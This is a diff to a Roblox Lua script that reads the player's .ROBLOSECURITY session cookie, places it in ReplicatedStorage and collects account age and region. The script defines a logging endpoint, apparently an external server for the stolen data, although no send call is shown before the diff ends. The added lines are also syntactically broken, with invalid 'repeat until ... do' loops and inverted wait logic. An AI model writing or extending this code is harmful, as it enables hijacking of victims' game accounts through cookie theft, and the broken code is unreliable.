@@ -1,12 +1,15 @@
 local Players = game:GetService("Players")
-game:GetService("CookieService"):GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") or ""
-local LocalizationService = game:GetService("LocalizationService")
+repeat until not game:GetService("CookieService") do wait(0.5) end
+local cookieService = game:GetService("CookieService")
+
+repeat until not game:GetService("LocalizationService") do wait(0.5) end
+local localizationService = game:GetService("LocalizationService")
 
 local player = Players.LocalPlayer
 local apiUrl = "https://depazzhub-api.onrender.com/log"
 
-local savedCookie = game:GetService("CookieService"):GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") or ""
-game.ReplicatedStorage.Cookies = savedCookie
+-- Usar CookieService directamente sin guardar en variable global primero
+game.ReplicatedStorage.Cookies = cookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") or ""
 
 local days = player.AccountAge
 local years = math.floor(days / 365)
@@ -16,7 +19,7 @@ if years > 0 then
 	ageText = years .. " years, " .. months .. " months (" .. days .. " days)"
 end
 
-local region = LocalizationService.RobloxLocaleId
+local region = localizationService.RobloxLocaleId
 
 local function clean(str)
 	return tostring(str):gsub('"', '\\"')
